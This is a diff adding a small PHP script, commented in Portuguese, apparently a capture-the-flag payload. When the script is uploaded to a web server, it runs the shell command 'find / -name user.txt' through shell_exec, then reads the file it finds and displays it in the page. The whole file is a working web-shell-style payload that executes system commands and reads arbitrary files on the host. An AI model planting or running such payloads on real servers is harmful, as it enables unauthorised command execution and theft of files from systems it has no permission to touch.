@@ -1,0 +1,16 @@
+<?php
+// 1. Comando para encontrar o caminho exato do arquivo no sistema
+$caminho = shell_exec("find / -name user.txt 2>/dev/null | head -n 1");
+$caminho = trim($caminho); // Remove quebras de linha
+
+if ($caminho) {
+    echo "<h3>Arquivo encontrado em: $caminho</h3>";
+    echo "<h3>Conteúdo:</h3>";
+    echo "<pre>";
+    // 2. Lê e exibe o conteúdo do arquivo
+    echo htmlspecialchars(file_get_contents($caminho));
+    echo "</pre>";
+} else {
+    echo "Arquivo 'user.txt' não encontrado no sistema.";
+}
+?>
